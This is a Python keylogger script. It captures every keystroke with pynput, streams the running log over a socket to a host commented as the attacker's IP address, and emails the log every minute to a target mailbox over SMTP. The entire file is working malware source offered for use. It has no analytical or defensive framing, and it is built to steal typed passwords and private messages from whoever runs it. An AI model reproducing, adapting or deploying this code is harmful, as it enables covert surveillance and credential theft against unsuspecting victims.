import socket
import smtplib
import threading
import time
from pynput import keyboard

# Configuration for email
EMAIL_ADDRESS = 'xxxxxxxxxxxxxx' # email for the sending operation
EMAIL_PASSWORD = 'xxxxxxxxxxxxx' 
SMTP_SERVER = 'xxxxxxxxxxx'
SMTP_PORT = "xxx"
TARGET_EMAIL = 'xxxxxxxxx' # email for receiving the logs

# Configuration for socket connection
SERVER_IP = '192.168.10.129'  # Attacker's IP address
SERVER_PORT = 7001        # Port for the live connection

# Keylogger class
class Keylogger:
    def __init__(self):
        self.log = ""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((SERVER_IP, SERVER_PORT))

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                self.log += " "
            elif str(key) == "Key.enter":
                self.log += "\n"
            else:
                self.log += " [{}] ".format(key)
        # Send the log via socket
        self.sock.send(self.log.encode())

    def send_logs(self):
        while True:
            if self.log:
                message = f"Subject: Keylogger Report\n\n{self.log}"
                try:
                    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                    server.starttls()
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.sendmail(EMAIL_ADDRESS, TARGET_EMAIL, message)
                    server.quit()
                except Exception as e:
                    print(f"Failed to send email: {e}")
                self.log = ""
            time.sleep(60)  # Send logs every minute

    def start(self):
        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            # Start the email sending thread
            email_thread = threading.Thread(target=self.send_logs)
            email_thread.start()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
